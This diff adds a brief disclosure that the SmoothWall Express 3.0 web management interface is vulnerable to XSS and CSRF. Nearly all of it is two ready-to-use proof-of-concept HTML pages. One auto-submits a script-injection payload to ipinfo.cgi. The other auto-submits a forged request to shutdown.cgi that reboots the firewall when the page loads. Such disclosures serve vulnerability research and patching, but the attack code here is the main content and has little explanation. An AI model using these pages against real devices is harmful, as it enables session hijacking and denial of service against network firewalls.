@@ -1,0 +1,28 @@
+The web management interface of SmoothWall Express 3.0 is vulnerable
+to xss and csrf.
+
+xss example:
+
+<html>
+<title> SmoothWall Express 3.0 xss </title>
+<body>
+ <form action="http://192.168.0.1:81/cgi-bin/ipinfo.cgi"; method="post"
+id="xssplz">
+        <input type="hidden" name="IP" value='"<script>alert(1);</script>'></input>
+        <input type="hidden" name="ACTION" value='Run'></input>
+</form>
+<script>document.getElementById("xssplz").submit();</script>
+</body>
+
+
+csrf example:
+
+<html>
+<title>  SmoothWall Express 3.0 csrf </title>
+<body>
+ <form action="http://192.168.0.1:81/cgi-bin/shutdown.cgi";
+method="post" id="csrfplz">
+        <input type="hidden" name="ACTION" value='Reboot'></input>
+</form>
+<script>document.getElementById("csrfplz").submit();</script>
+</body>
